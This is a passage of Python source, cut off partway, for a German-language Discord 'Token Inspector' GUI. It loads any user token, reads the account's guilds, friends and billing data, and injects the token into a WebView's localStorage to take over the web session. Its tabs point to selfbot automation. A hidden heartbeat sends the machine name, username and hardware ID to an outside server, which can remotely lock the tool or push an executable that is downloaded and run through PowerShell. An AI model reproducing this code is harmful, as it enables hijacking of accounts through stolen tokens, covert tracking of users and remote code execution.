import os
import sys

# Configure UTF-8 on Windows console immediately or mock if GUI mode
if sys.stdout is None:
    class DummyStream:
        def write(self, *args, **kwargs): pass
        def flush(self, *args, **kwargs): pass
    sys.stdout = DummyStream()
    sys.stderr = DummyStream()
else:
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if sys.stderr and hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import customtkinter as ctk
from PIL import Image, ImageDraw
import requests
import threading
import io
import json
import time
import subprocess
import re
import random
from datetime import datetime

class ColorPalette(dict):
    def __getitem__(self, key):
        if key not in self:
            if "hover" in key:
                return "#2563eb"
            if "border" in key:
                return "#3a4964"
            if "bg" in key:
                return "#161b26"
            if "text" in key:
                return "#f8fafc"
            return "#3b82f6"
        return super().__getitem__(key)

C = ColorPalette({
    # Frosted Slate / Silver-Gray Glaspalette
    "bg":                   "#0d1017",
    "sidebar":              "#121620",
    "card":                 "#161b26",
    "card_alt":             "#1b2232",
    "card_hover":           "#222b3e",
    "card_border":          "#263246",
    "card_border_hi":       "#3a4964",
    
    # Button Palette
    "btn_gray":             "#1a202c",
    "btn_gray_hover":       "#262f40",
    "btn_gray_border":      "#323e56",
    "btn_gray_text":        "#e2e8f0",
    
    # Durchsichtige Akzent-Buttons & Karten
    "acc_yellow_bg":        "#1a1d24",
    "acc_yellow_border":    "#eab308",
    "acc_yellow_text":      "#fde047",
    "acc_yellow_hover":     "#26251b",
    
    "acc_purple_bg":        "#1a1d26",
    "acc_purple_border":    "#a855f7",
    "acc_purple_text":      "#d8b4fe",
    "acc_purple_hover":     "#241d2e",

    "acc_orange_bg":        "#1a1d24",
    "acc_orange_border":    "#f97316",
    "acc_orange_text":      "#fdba74",
    "acc_orange_hover":     "#28201b",

    "acc_green_bg":         "#171e22",
    "acc_green_border":     "#22c55e",
    "acc_green_text":       "#86efac",
    "acc_green_hover":      "#1a261f",

    "acc_cyan_bg":          "#161e27",
    "acc_cyan_border":      "#06b6d4",
    "acc_cyan_text":        "#67e8f9",
    "acc_cyan_hover":       "#18252f",

    # Typografie & Signale
    "text":                 "#f8fafc",
    "text_sub":             "#cbd5e1",
    "text_muted":           "#818ea3",
    "text_dim":             "#475569",
    
    "blue":                 "#3b82f6",
    "blue_hover":           "#2563eb",
    "blurple":              "#5865f2",
    "blurple_hi":           "#4752c4",
    "green":                "#22c55e",
    "green_bg":             "#13261a",
    "green_border":         "#16a34a",
    "red":                  "#ef4444",
    "red_bg":               "#20181b",
    "red_border":           "#dc2626",
    "red_hover":            "#35171d",
    "red_text":             "#fca5a5",
})

PLATFORM_ICONS = {
    "spotify":       {"color": "#1db954", "tag": "SP", "name": "Spotify"},
    "steam":         {"color": "#66c0f4", "tag": "ST", "name": "Steam"},
    "twitch":        {"color": "#a970ff", "tag": "TW", "name": "Twitch"},
    "youtube":       {"color": "#ff4444", "tag": "YT", "name": "YouTube"},
    "github":        {"color": "#f0f6fc", "tag": "GH", "name": "GitHub"},
    "reddit":        {"color": "#ff5722", "tag": "RD", "name": "Reddit"},
    "twitter":       {"color": "#1da1f2", "tag": "TW", "name": "Twitter / X"},
    "x":             {"color": "#ffffff", "tag": "X",  "name": "X (Twitter)"},
    "xbox":          {"color": "#107c10", "tag": "XB", "name": "Xbox Live"},
    "playstation":   {"color": "#006fcd", "tag": "PS", "name": "PlayStation"},
    "battlenet":     {"color": "#00aeff", "tag": "BN", "name": "Battle.net"},
    "riotgames":     {"color": "#eb0029", "tag": "RG", "name": "Riot Games"},
    "tiktok":        {"color": "#00f2fe", "tag": "TT", "name": "TikTok"},
}

DEMO_DATA = {
    "user": {
        "id": "1083429182736451290",
        "username": "nightheid_pro",
        "global_name": "Night System Admin",
        "avatar": None,
        "discriminator": "0",
        "public_flags": (1 << 6) | (1 << 9) | (1 << 22),
        "flags": (1 << 6) | (1 << 9) | (1 << 22),
        "banner": None,
        "banner_color": "#5865f2",
        "accent_color": 5793266,
        "bio": "Night System - Silver-Glass Edition - Maximale Performance und Transparenz.",
        "locale": "de",
        "mfa_enabled": True,
        "email": "maxia.night@example.com",
        "verified": True,
        "phone": "+49 170 .......",
        "premium_type": 2
    },
    "connections": [
        {"type": "spotify", "name": "Nightheid_Official", "verified": True, "show_activity": True},
        {"type": "steam", "name": "NightSystem77", "verified": True, "show_activity": True},
        {"type": "github", "name": "NightDev-Maxi", "verified": True, "show_activity": False},
        {"type": "youtube", "name": "Night System Studio", "verified": True, "show_activity": True},
        {"type": "twitch", "name": "nightheid_live", "verified": True, "show_activity": True},
    ],
    "guilds": [
        {"id": "119283746501928374", "name": "Night System Community", "owner": True, "permissions": "8", "icon": None},
        {"id": "228374659102938475", "name": "CyberSec Lab HQ", "owner": True, "permissions": "8", "icon": None},
        {"id": "337485960293847561", "name": "Gaming Lounge VIP", "owner": False, "permissions": "8", "icon": None},
        {"id": "448596071829304152", "name": "Phasmophobia Hunters EU", "owner": False, "permissions": "2048", "icon": None},
        {"id": "559607182930415263", "name": "CustomTkinter Developers", "owner": False, "permissions": "1024", "icon": None},
        {"id": "660718293041526374", "name": "Public Anime Hangout", "owner": False, "permissions": "1024", "icon": None},
    ],
    "friends": [
        {"id": "1001", "name": "Alex Gamer", "username": "alex_gamer", "type_name": "Freund", "is_group": False},
        {"id": "1002", "name": "Sarah C.", "username": "sarah_codes", "type_name": "Freund", "is_group": False},
        {"id": "1003", "name": "Shadow Ninja", "username": "shadow_ninja", "type_name": "Freund", "is_group": False},
        {"id": "1004", "name": "Gaming Squad EU", "username": "5 Mitglieder", "type_name": "Gruppe", "is_group": True},
        {"id": "1005", "name": "Dev Lounge Group", "username": "3 Mitglieder", "type_name": "Gruppe", "is_group": True},
        {"id": "1006", "name": "Lisa M.", "username": "lisa_music", "type_name": "Anfrage", "is_group": False},
    ],
    "billing": [
        {"id": "9918273645", "type": 1, "brand": "visa", "last_4": "4242", "expires_month": 12, "expires_year": 2028, "invalid": False, "default": True},
        {"id": "8827364510", "type": 2, "email": "maxia.paypal@example.com", "invalid": False, "default": False}
    ],
    "user_to_channel_map": {
        "1001": "2001",
        "1002": "2002",
        "1003": "2003",
        "1006": "2006"
    }
}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# ==============================================================================
#  HILFSFUNKTIONEN & SICHERE API-ANFRAGEN
# ==============================================================================
def get_asset_path(filename):
    if hasattr(sys, "_MEIPASS"):
        p1 = os.path.join(sys._MEIPASS, "assets", filename)
        if os.path.exists(p1): return p1
        p2 = os.path.join(sys._MEIPASS, filename)
        if os.path.exists(p2): return p2
    base_dir = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(os.path.dirname(sys.executable), "assets", filename),
        os.path.join(base_dir, "..", "assets", filename),
        os.path.join(base_dir, "assets", filename),
        os.path.join(os.getcwd(), "assets", filename),
        os.path.join(r"C:\Users\maxia\Desktop\Night System\assets", filename)
    ]
    for c in candidates:
        if os.path.exists(c): return c
    return None

def snowflake_to_datetime_info(sf_id):
    try:
        sf_int = int(sf_id)
        ts_ms = (sf_int >> 22) + 1420070400000
        dt = datetime.fromtimestamp(ts_ms / 1000.0)
        now = datetime.now()
        days = (now - dt).days
        years = days // 365
        rem_days = days % 365
        months = rem_days // 30
        parts = []
        if years > 0: parts.append(f"{years} J.")
        if months > 0: parts.append(f"{months} M.")
        if not parts: parts.append(f"{days} Tage")
        short_age = " ".join(parts)
        return dt.strftime("%d.%m.%Y"), f"vor {short_age}", days
    except Exception:
        return "Unbekannt", "-", 0

def make_circle_avatar(pil_img, size=(64, 64)):
    try:
        pil_img = pil_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
        mask = Image.new("L", size, 0)
        draw = ImageDraw.Draw(mask)
        draw.ellipse((0, 0, size[0], size[1]), fill=255)
        output = Image.new("RGBA", size, (0, 0, 0, 0))
        output.paste(pil_img, (0, 0), mask=mask)
        return output
    except Exception:
        return None

def make_discord_api_request(method, url, token, json_data=None, timeout=6):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }
    for _ in range(3):
        try:
            m = method.upper()
            if m == "GET":
                r = requests.get(url, headers=headers, timeout=timeout)
            elif m == "POST":
                r = requests.post(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
            elif m == "PATCH":
                r = requests.patch(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
            elif m == "PUT":
                r = requests.put(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)
            elif m == "DELETE":
                r = requests.delete(url, headers=headers, timeout=timeout)
            else:
                return None

            if r.status_code == 429:
                try:
                    retry_sec = float(r.json().get("retry_after", 1.0))
                except Exception:
                    retry_sec = 1.0
                time.sleep(min(retry_sec, 2.5))
                continue

            return r
        except Exception:
            time.sleep(0.3)
    return None

# ==============================================================================
#  EXTRA-UI BROWSER AUTO-LOGIN (Microsoft Edge WebView2)
# ==============================================================================
def run_browser_session(token: str, username: str = ""):
    import webview

    token = token.strip()
    if not token:
        return

    title = f"Night System - Discord Web Session - @{username}" if username else "Night System - Discord Web Session"
    start_url = "https://discord.com/login"

    raw_js = r"""
    (function() {
        const token = __TOKEN_JSON__;
        const username = __USER_JSON__;

        function injectTokenNow() {
            try { localStorage.setItem("token", JSON.stringify(token)); } catch(e) {}
            try { localStorage.token = JSON.stringify(token); } catch(e) {}
            try {
                let ifr = document.getElementById("__night_token_ifr");
                if (!ifr) {
                    ifr = document.createElement("iframe");
                    ifr.id = "__night_token_ifr";
                    ifr.style.display = "none";
                    document.body.appendChild(ifr);
                }
                ifr.contentWindow.localStorage.setItem("token", JSON.stringify(token));
                ifr.contentWindow.localStorage.token = JSON.stringify(token);
            } catch(e) {}
        }

        injectTokenNow();
        let count = 0;
        let iv = setInterval(function() {
            count++;
            injectTokenNow();
            if (count >= 15) {
                clearInterval(iv);
                if (window.location.pathname.includes("login") || window.location.pathname === "/" || window.location.pathname.includes("register")) {
                    window.location.replace("https://discord.com/channels/@me");
                }
            }
        }, 100);

        function addFloatingBar() {
            if (document.getElementById("night-helper-bar")) return;
            const bar = document.createElement("div");
            bar.id = "night-helper-bar";
            const userLabel = username ? ('@' + username) : 'Auto-Login aktiv';
            bar.innerHTML = '<div style="display:flex;align-items:center;gap:6px;"><span style="font-weight:700;color:#5865f2;">Night System</span><span style="color:#8b94a5;">|</span><span style="color:#c7cdd8;font-weight:600;">' + userLabel + '</span></div><button id="night-reinject-btn" style="background:#5865f2;color:#fff;border:none;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:700;cursor:pointer;">Auto-Login</button><button id="night-reload-btn" style="background:#202b3d;color:#fff;border:1px solid #2e3d57;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:600;cursor:pointer;">Reload</button><span id="night-close-bar" style="cursor:pointer;color:#8b94a5;font-weight:bold;padding-left:4px;">X</span>';
            bar.style.cssText = "position:fixed;top:10px;right:18px;z-index:99999999;background:rgba(14,19,29,0.92);border:1px solid #2e3d57;backdrop-filter:blur(10px);border-radius:10px;padding:6px 14px;box-shadow:0 8px 30px rgba(0,0,0,0.6);display:flex;align-items:center;gap:12px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:12px;color:#ffffff;user-select:none;";
            document.body.appendChild(bar);

            const rBtn = document.getElementById("night-reinject-btn");
            if (rBtn) {
                rBtn.onclick = function() {
                    injectTokenNow();
                    rBtn.innerText = "Eingeloggt";
                    setTimeout(() => { window.location.replace("https://discord.com/channels/@me"); }, 500);
                };
            }
            const relBtn = document.getElementById("night-reload-btn");
            if (relBtn) { relBtn.onclick = function() { location.reload(); }; }
            const cBtn = document.getElementById("night-close-bar");
            if (cBtn) { cBtn.onclick = function() { bar.remove(); }; }
        }
        setTimeout(addFloatingBar, 1500);
    })();
    """
    injection_js = raw_js.replace("__TOKEN_JSON__", json.dumps(token)).replace("__USER_JSON__", json.dumps(username))

    window = webview.create_window(
        title=title,
        url=start_url,
        width=1340,
        height=880,
        min_size=(960, 600),
        text_select=True,
    )

    def on_loaded():
        def run_js():
            time.sleep(0.4)
            try: window.evaluate_js(injection_js)
            except Exception: pass
        threading.Thread(target=run_js, daemon=True).start()

    window.events.loaded += on_loaded
    webview.start(private_mode=False)


DISCORD_TOOL_VERSION = "1.1.2"
CLOUD_API_ENDPOINT = "https://whatsapp-kadi.onrender.com/api/discord"

# ==============================================================================
#  HAUPTANWENDUNG (DURCHSICHTIGE SILVER-GLASS UI OHNE EMOJIS)
# ==============================================================================
class App(ctk.CTk):
    def __init__(self, user_data=None, connections_data=None, guilds_data=None, billing_data=None, friends_data=None, user_to_channel_map=None, token="", cloud_info=None):
        super().__init__()
        self.title("Night System - Token Inspector Pro")
        self.geometry("1260x840")
        self.minsize(1020, 680)
        self.configure(fg_color=C["bg"])
        
        # Echte Fenster-Transparenz (Durchsichtigkeits-Effekt)
        try:
            self.attributes("-alpha", 0.93)
        except Exception:
            pass

        # Windows Taskleisten-Icon
        icon_path = get_asset_path("icon.ico")
        if icon_path and os.path.exists(icon_path):
            try: self.iconbitmap(icon_path)
            except Exception: pass

        self.cloud_info = cloud_info or {}
        self.token = token
        self.user_data = user_data or {}
        self.connections_data = connections_data or []
        self.guilds_data = guilds_data or []
        self.billing_data = billing_data or []
        self.friends_data = friends_data or []
        self.user_to_channel_map = user_to_channel_map or {}
        self.active_tab = "overview"
        self.avatar_img_ctk = None

        # Server Management State
        self.guild_cards = {}
        self.guild_checkboxes = {}
        self.leave_in_progress = False
        self.stop_requested = False

        # Freunde & Gruppen State
        self.friend_cards = {}
        self.friend_checkboxes = {}
        self.friend_leave_in_progress = False
        self.friend_stop_requested = False

        # Extra Tab State
        self.extra_in_progress = False
        self.extra_stop_requested = False

        # Bot & Click Instant State
        self.bot_active = False
        self.bot_loading = False
        self.external_click_instant_win = None
        self.click_instant_running = False

        # Message Sender State
        self.msg_send_in_progress = False
        self.msg_stop_requested = False

        self._build_layout()
        self._load_avatar_async()

    def _build_layout(self):
        # 1. LINKE SIDEBAR (Navigation & User-Profil in runder Schiefer-Optik)
        self.sidebar = ctk.CTkFrame(self, width=240, fg_color=C["sidebar"], corner_radius=18, border_width=1, border_color=C["card_border"])
        self.sidebar.pack(side="left", fill="y", padx=(14, 7), pady=14)
        self.sidebar.pack_propagate(False)
        self._build_sidebar()

        # 2. VOLLER MITTLERER CONTENT-BEREICH
        self.center_area = ctk.CTkFrame(self, fg_color="transparent")
        self.center_area.pack(side="left", fill="both", expand=True, padx=(7, 14), pady=14)
        
        # Container fuer dynamische Tabs
        self.tab_container = ctk.CTkFrame(self.center_area, fg_color="transparent")
        self.tab_container.pack(fill="both", expand=True)

        self.frame_overview      = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_guilds        = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_friends       = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_join          = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_extra         = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_bot           = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_click_instant = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_conn          = ctk.CTkFrame(self.tab_container, fg_color="transparent")
        self.frame_billing       = ctk.CTkFrame(self.tab_container, fg_color="transparent")

        self._build_overview_tab()
        self._build_guilds_tab()
        self._build_friends_tab()
        self._build_join_tab()
        self._build_extra_tab()
        self._build_bot_tab()
        self._build_click_instant_tab()
        self._build_conn_tab()
        self._build_billing_tab()

        self._switch_tab("overview")
        self._populate_quick_targets()
        self._start_cloud_heartbeat_sync()

    def _start_cloud_heartbeat_sync(self):
        def _worker():
            import socket, platform, uuid
            pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"
            username = os.environ.get("USERNAME") or "Benutzer"
            os_name = f"{platform.system()} {platform.release()}"
            hwid = f"HWID-{uuid.getnode():012X}"

            payload = {
                "clientId": f"{pc_name}_{username}",
                "hwid": hwid,
                "pcName": pc_name,
                "username": username,
                "os": os_name,
                "version": DISCORD_TOOL_VERSION
            }

            while True:
                time.sleep(30)
                try:
                    res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=5)
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("isLocked"):
                            self.after(0, lambda r=data.get("lockReason"): self._on_remote_lock_triggered(r))
                            break
                        if data.get("updateAvailable"):
                            self.after(0, lambda d=data: self._on_remote_update_detected(d))
                            break
                        ann = data.get("announcement")
                        if ann and ann != getattr(self, "_last_broadcast_seen", ""):
                            self._last_broadcast_seen = ann
                            self._append_bot_log(f"[BROADCAST] {ann}")
                except Exception:
                    pass

        threading.Thread(target=_worker, daemon=True).start()

    def _on_remote_lock_triggered(self, reason):
        self._append_bot_log(f"[WARNUNG] Tool wurde ueber das Web-Dashboard gesperrt! Grund: {reason}")
        try:
            import tkinter.messagebox as mb
            mb.showerror("Night System - Gesperrt", f"Das Tool wurde vom Administrator auf dem Web-Dashboard gesperrt!\n\nGrund: {reason}\n\nDas Programm wird beendet.")
        except Exception:
            pass
        self.destroy()
        sys.exit(0)

    def _on_remote_update_detected(self, data):
        new_ver = data.get("latestVersion", "")
        print(f"\n  [UPDATE] Version v{new_ver} erkannt.")
        print("  [UPDATE] Schliesse Tool & lade Update herunter...")
        self._append_bot_log(f"[UPDATE] Version v{new_ver} verfuegbar. Auto-Update...")

        try:
            self.destroy()
        except Exception:
            pass

        def _do_update():
            try:
                base_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
                exe_path = os.path.join(base_dir, "Nightheid.exe")
                temp_exe = os.path.join(base_dir, "Nightheid.exe.new")

                dl_url = f"{CLOUD_API_ENDPOINT}/file-content?id=discord_tool/Nightheid.exe&download=1"
                r = requests.get(dl_url, timeout=60)
                if r.status_code == 200:
                    with open(temp_exe, "wb") as f:
                        f.write(r.content)

                    try:
                        sp = get_settings_path()
                        if os.path.exists(sp):
                            with open(sp, "r", encoding="utf-8") as sf:
                                sdata = json.load(sf)
                            sdata["version"] = str(new_ver)
                            sdata["installed_revision"] = int(data.get("updateRevision", 1))
                            with open(sp, "w", encoding="utf-8") as sf:
                                json.dump(sdata, sf, indent=2)
                    except Exception:
                        pass

                    print("  [UPDATE] Download abgeschlossen. Starte Tool neu...\n")
                    ps_cmd = f"Start-Sleep -Milliseconds 600; Move-Item -Path '{temp_exe}' -Destination '{exe_path}' -Force; Start-Process -FilePath '{exe_path}'"
                    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_cmd])
                    sys.exit(0)
            except Exception as ex:
                print(f"  [FEHLER] Auto-Update fehlgeschlagen: {ex}")

        threading.Thread(target=_do_update, daemon=False).start()

    def logout_and_switch_token(self):
        clear_saved_token()
        self.destroy()
        if getattr(sys, "frozen", False):
            base_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
            exe_path = os.path.join(base_dir, "Nightheid.exe")
            subprocess.Popen([exe_path])
        else:
            subprocess.Popen([sys.executable, sys.argv[0]])
        sys.exit(0)

    # --------------------------------------------------------------------------
    # 1. SIDEBAR
    # --------------------------------------------------------------------------
    def _build_sidebar(self):
        u = self.user_data
        uname = u.get("username", "Benutzer")
        gname = u.get("global_name") or uname
        initial = (gname[:1] or uname[:1] or "U").upper()

        prof_card = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        prof_card.pack(fill="x", padx=14, pady=(18, 16))

        self.lbl_side_avatar = ctk.CTkLabel(prof_card, text=initial, font=("Segoe UI", 14, "bold"), text_color=C["text_sub"], width=40, height=40, fg_color=C["card"], corner_radius=20)
        self.lbl_side_avatar.pack(side="left", padx=(0, 10))

        text_col = ctk.CTkFrame(prof_card, fg_color="transparent")
        text_col.pack(side="left", fill="x", expand=True)

        self.lbl_sidebar_name = ctk.CTkLabel(text_col, text=gname[:17], font=("Segoe UI", 12, "bold"), text_color=C["text"])
        self.lbl_sidebar_name.pack(anchor="w")

        lbl_sub = ctk.CTkLabel(text_col, text="Online", font=("Segoe UI", 9.5, "bold"), text_color=C["green"])
        lbl_sub.pack(anchor="w")

        self.lbl_menu_title = ctk.CTkLabel(self.sidebar, text="HAUPTMENUE", font=("Segoe UI", 9, "bold"), text_color=C["text_dim"])
        self.lbl_menu_title.pack(anchor="w", padx=18, pady=(10, 6))

        # Navigation Tabs
        self.nav_order = ["overview", "guilds", "friends", "join", "extra", "bot", "click_instant", "conn", "billing"]
        self.nav_btns = {}
        self.nav_btns["overview"]      = self._create_nav_btn("Uebersicht", "overview")
        self.nav_btns["guilds"]        = self._create_nav_btn(f"Server ({len(self.guilds_data)})", "guilds")
        self.nav_btns["friends"]       = self._create_nav_btn(f"Freunde & Gruppen ({len(self.friends_data)})", "friends")
        self.nav_btns["join"]          = self._create_nav_btn("Server beitreten", "join")
        self.nav_btns["extra"]         = self._create_nav_btn("Extra", "extra")
        self.nav_btns["bot"]           = self._create_nav_btn("Bot", "bot")
        self.nav_btns["click_instant"] = self._create_nav_btn("Click Instant", "click_instant")
        self.nav_btns["conn"]          = self._create_nav_btn(f"Verbindungen ({len(self.connections_data)})", "conn")
        self.nav_btns["billing"]       = self._create_nav_btn("Nitro & Billing", "billing")

        # click_instant anfaenglich ausblenden (wird freigeschaltet wenn Bot aktiv)
        self.nav_btns["click_instant"].pack_forget()

        # Unten: Token wechseln & Web Login Buttons
        bottom_box = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        bottom_box.pack(side="bottom", fill="x", padx=12, pady=16)

        btn_switch_token = ctk.CTkButton(
            bottom_box,
            text="Token wechseln",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["card_alt"],
            text_color=C["text_sub"],
            hover_color=C["card_hover"],
            border_color=C["card_border"],
            border_width=1,
            height=34,
            corner_radius=10,
            command=self.logout_and_switch_token
        )
        btn_switch_token.pack(fill="x", pady=(0, 6))

        lbl_foot = ctk.CTkLabel(bottom_box, text=f"Night System v{DISCORD_TOOL_VERSION}", font=("Segoe UI", 9), text_color=C["text_dim"])
        lbl_foot.pack(pady=(4, 0))

    def _create_nav_btn(self, text, tab_name):
        btn = ctk.CTkButton(
            self.sidebar,
            text=text,
            font=("Segoe UI", 11, "bold"),
            fg_color="transparent",
            text_color=C["text_sub"],
            hover_color=C["card_hover"],
            anchor="w",
            height=38,
            corner_radius=12,
            command=lambda: self._switch_tab(tab_name)
        )
        btn.pack(fill="x", padx=12, pady=2)
        return btn

    def _switch_tab(self, tab_name):
        self.active_tab = tab_name
        for name, btn in self.nav_btns.items():
            if name == tab_name:
                btn.configure(fg_color=C["card_hover"], text_color=C["text"], border_color=C["card_border"], border_width=1)
            else:
                btn.configure(fg_color="transparent", text_color=C["text_sub"], border_width=0)

        for f in [self.frame_overview, self.frame_guilds, self.frame_friends, self.frame_join, self.frame_extra, self.frame_bot, self.frame_click_instant, self.frame_conn, self.frame_billing]:
            f.pack_forget()

        tab_map = {
            "overview":      self.frame_overview,
            "guilds":        self.frame_guilds,
            "friends":       self.frame_friends,
            "join":          self.frame_join,
            "extra":         self.frame_extra,
            "bot":           self.frame_bot,
            "click_instant": self.frame_click_instant,
            "conn":          self.frame_conn,
            "billing":       self.frame_billing
        }
        if tab_name in tab_map:
            tab_map[tab_name].pack(fill="both", expand=True)

    def _enter_bot_mode(self):
        # Alle anderen Tabs schliessen/ausblenden, nur Bot-Tab bleibt sichtbar
        for name, btn in self.nav_btns.items():
            if name != "bot":
                btn.pack_forget()
        if hasattr(self, "lbl_menu_title"):
            self.lbl_menu_title.configure(text="BOT MODUS")
        self._switch_tab("bot")

    def _exit_bot_mode(self):
        # Alle Tabs wiederherstellen
        for name in self.nav_order:
            if name == "click_instant":
                continue
            btn = self.nav_btns.get(name)
            if btn:
                btn.pack_forget()
                btn.pack(fill="x", padx=12, pady=2)
        if hasattr(self, "lbl_menu_title"):
            self.lbl_menu_title.configure(text="HAUPTMENUE")

    # --------------------------------------------------------------------------
    # 2. MITTLERER CONTENT: UEBERSICHT
    # --------------------------------------------------------------------------
    def _build_overview_tab(self):
        u = self.user_data
        uname = u.get("username", "-")
        gname = u.get("global_name") or uname
        uid = str(u.get("id", "-"))
        dt_str, age_str, days_num = snowflake_to_datetime_info(uid)
        owned_guilds = sum(1 for g in self.guilds_data if g.get("owner"))
        initial = (gname[:1] or uname[:1] or "U").upper()

        scroll = ctk.CTkScrollableFrame(self.frame_overview, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        # HERO CARD
        hero_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        hero_card.pack(fill="x", pady=(0, 14))

        hero_inner = ctk.CTkFrame(hero_card, fg_color="transparent")
        hero_inner.pack(fill="x", padx=22, pady=20)

        self.lbl_hero_avatar = ctk.CTkLabel(hero_inner, text=initial, font=("Segoe UI", 28, "bold"), text_color=C["text_sub"], width=80, height=80, fg_color=C["card_alt"], corner_radius=40)
        self.lbl_hero_avatar.pack(side="left", padx=(0, 20))

        hero_text = ctk.CTkFrame(hero_inner, fg_color="transparent")
        hero_text.pack(side="left", fill="x", expand=True)

        self.lbl_hero_title = ctk.CTkLabel(hero_text, text=gname, font=("Segoe UI", 22, "bold"), text_color=C["text"])
        self.lbl_hero_title.pack(anchor="w")

        self.lbl_hero_sub = ctk.CTkLabel(hero_text, text=f"@{uname}  |  ID: {uid}", font=("Segoe UI", 11), text_color=C["text_muted"])
        self.lbl_hero_sub.pack(anchor="w", pady=(2, 6))

        bio_txt = u.get("bio") or "Discord Account - Ueber Night System verifiziert & geladen."
        self.lbl_hero_bio = ctk.CTkLabel(hero_text, text=bio_txt[:110], font=("Segoe UI", 10.5), text_color=C["text_sub"])
        self.lbl_hero_bio.pack(anchor="w")

        hero_actions = ctk.CTkFrame(hero_inner, fg_color="transparent")
        hero_actions.pack(side="right", padx=(10, 0))



        btn_hero_guilds = ctk.CTkButton(
            hero_actions,
            text="Server oeffnen",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            corner_radius=12,
            height=34,
            width=110,
            command=lambda: self._switch_tab("guilds")
        )
        btn_hero_guilds.pack(pady=3)

        # 5 CARDS GRID
        grid_frame = ctk.CTkFrame(scroll, fg_color="transparent")
        grid_frame.pack(fill="x", pady=(0, 14))
        grid_frame.grid_columnconfigure((0, 1), weight=1)

        self.c1_card = ctk.CTkFrame(grid_frame, fg_color=C["acc_yellow_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_yellow_border"])
        self.c1_card.grid(row=0, column=0, padx=(0, 7), pady=(0, 12), sticky="nsew")
        self._populate_accent_card(
            self.c1_card,
            "SERVER STATS",
            f"{len(self.guilds_data)}",
            f"{owned_guilds} eigene Inhaber-Server",
            C["acc_yellow_text"],
            action_btn=("Server verwalten >", lambda: self._switch_tab("guilds"), C["acc_yellow_border"], C["acc_yellow_text"])
        )

        c2 = ctk.CTkFrame(grid_frame, fg_color=C["acc_orange_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_orange_border"])
        c2.grid(row=0, column=1, padx=(7, 0), pady=(0, 12), sticky="nsew")
        self._populate_accent_card(c2, "ACCOUNT ALTER", f"{days_num} Tage", f"Erstellt: {dt_str} ({age_str})", C["acc_orange_text"])

        sub_grid = ctk.CTkFrame(scroll, fg_color="transparent")
        sub_grid.pack(fill="x", pady=(0, 14))
        sub_grid.grid_columnconfigure((0, 1, 2), weight=1)

        p_type = u.get("premium_type", 0)
        nitro_txt = "Nitro Booster" if p_type == 2 else ("Nitro Classic" if p_type == 1 else ("Nitro Basic" if p_type == 3 else "Kein Nitro"))
        c3 = ctk.CTkFrame(sub_grid, fg_color=C["acc_purple_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_purple_border"])
        c3.grid(row=0, column=0, padx=(0, 6), sticky="nsew")
        self._populate_accent_card(
            c3,
            "NITRO LEVEL",
            nitro_txt,
            f"Abo-Stufe {p_type}",
            C["acc_purple_text"],
            small=True,
            action_btn=("Nitro Details >", lambda: self._switch_tab("billing"), C["acc_purple_border"], C["acc_purple_text"])
        )

        mfa = u.get("mfa_enabled", False)
        ver = u.get("verified", False)
        c4 = ctk.CTkFrame(sub_grid, fg_color=C["acc_green_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_green_border"])
        c4.grid(row=0, column=1, padx=6, sticky="nsew")
        self._populate_accent_card(c4, "SICHERHEIT", "2FA Aktiv" if mfa else "2FA Inaktiv", "E-Mail verifiziert" if ver else "Nicht verifiziert", C["acc_green_text"], small=True)

        c5 = ctk.CTkFrame(sub_grid, fg_color=C["acc_cyan_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_cyan_border"])
        c5.grid(row=0, column=2, padx=(6, 0), sticky="nsew")
        self._populate_accent_card(
            c5,
            "KONTAKTE",
            f"{len(self.friends_data)} Freunde & DMs",
            f"{len(self.connections_data)} Verknuepfungen",
            C["acc_cyan_text"],
            small=True,
            action_btn=("Freunde oeffnen >", lambda: self._switch_tab("friends"), C["acc_cyan_border"], C["acc_cyan_text"])
        )

        detail_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        detail_card.pack(fill="x", pady=(0, 10))

        dc_top = ctk.CTkFrame(detail_card, fg_color="transparent")
